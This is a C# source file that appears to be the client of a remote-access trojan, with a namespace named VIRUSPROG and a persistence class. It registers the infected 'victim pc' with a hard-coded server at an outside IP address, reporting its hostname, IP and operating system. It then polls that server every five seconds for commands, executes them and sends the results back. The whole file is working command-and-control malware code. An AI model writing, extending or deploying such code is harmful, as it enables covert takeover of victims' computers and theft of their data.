using System;
using VIRUSPROG;

GeneralInfo infoObject = new GeneralInfo();
Persistence presObject = new Persistence(infoObject);
Operations opsObject = new Operations(infoObject);

string commandURL = "http://45.83.40.161/getcommand.php";
string registerURL = "http://45.83.40.161/register.php";
string getResult = "http://45.83.40.161/getresults.php";


System.Net.WebClient webObj = new System.Net.WebClient();
int exceptionCounter = 0;
string parameters = "hostname=" + infoObject.hostName + "&ip=" + infoObject.ipv4Address + "&operatingsystem=" + infoObject.oSystem;
webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
webObj.UploadString(registerURL, parameters);//register the victim pc


while (true)
{//will give us info every 5 seconds
    if (exceptionCounter >= 20)
    {
        break;

    }
    try
    {//Recive the command for the server and return the result
        webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
        string takenCommand = webObj.UploadString(commandURL, parameters);

        if (takenCommand.Length > 1)
        {

            string commandResult = opsObject.CommandParser(takenCommand);
            string resultParameters = "hostname=" + infoObject.hostName + "&ip=" + infoObject.ipv4Address + "&result=" + commandResult;
            Console.WriteLine("[Victim]: the result of the command:"+takenCommand+"\nResult:\n"+commandResult);
            webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            webObj.UploadString(getResult, resultParameters);//Return the result value 
        }
        System.Threading.Thread.Sleep(5000);
        exceptionCounter = 0;//if no exception occurs, reset the exception counter
    }
    catch (Exception e)
    {
        Console.WriteLine("[Victim] "+e.Message);//For documentation
        exceptionCounter++;
        System.Threading.Thread.Sleep(5000);
    }
}
